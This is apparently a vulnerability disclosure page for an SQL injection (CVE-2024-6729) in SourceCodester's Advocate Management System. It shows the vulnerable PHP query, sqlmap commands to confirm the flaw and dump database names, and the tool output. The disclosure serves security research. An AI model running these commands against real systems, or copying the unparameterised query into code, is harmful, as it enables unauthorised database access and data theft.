---
slug: CVE-2024-6729
title: CVE-2024-6729
sidebar_position: 1
---

&nbsp;

## Details

Attack type: SQL injection

CWE-89:	Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Vendor: SourceCodester

Product: Advocate Management System

Affected components: `/control/add_act.php`

Injection parameter: `MULTIPART aname`


&nbsp;


## POC

![101](https://github.com/user-attachments/assets/08f216aa-7f7a-4e1f-b24a-e1a6fbccae96)

The `add_acts.php` file adds the use input directly into the SQL query, without any parameterizaztion.

![image](https://github.com/user-attachments/assets/31bc120a-c68f-4e60-9892-7c5ca02c2d22)

```php
$aname = $_POST['aname'];
:
: <SNIP>
:
$sql = "INSERT INTO legel_acts(act_name,status) VALUES ('$aname','1')";
```

Intercept request using Burpsuite Proxy.

![102](https://github.com/user-attachments/assets/53f98839-746f-461b-a1d7-70aeb45f1db7)

Save the request to `control.add_act.txt`.

The vulnerability can be verified with the following command: 

```
sqlmap -r control.add_act.txt --batch
```

![51](https://github.com/user-attachments/assets/33cbe30f-640d-42cb-a5f2-19d0ab89e9a3)

```
Parameter: MULTIPART aname ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: -----------------------------8879615583215427378340903645
Content-Disposition: form-data; name="aname"
```

The databases can be dumped with the following command:

```
sqlmap -r control.add_act.txt --batch --dbs
```

![154](https://github.com/user-attachments/assets/e4498d58-3d53-4475-b1c5-a83199184f34)

```
[04:20:26] [INFO] fetching database names
[04:20:26] [INFO] resumed: 'information_schema'
[04:20:26] [INFO] resumed: 'kortex_lite'
available databases [2]:
[*] information_schema
[*] kortex_lite
```
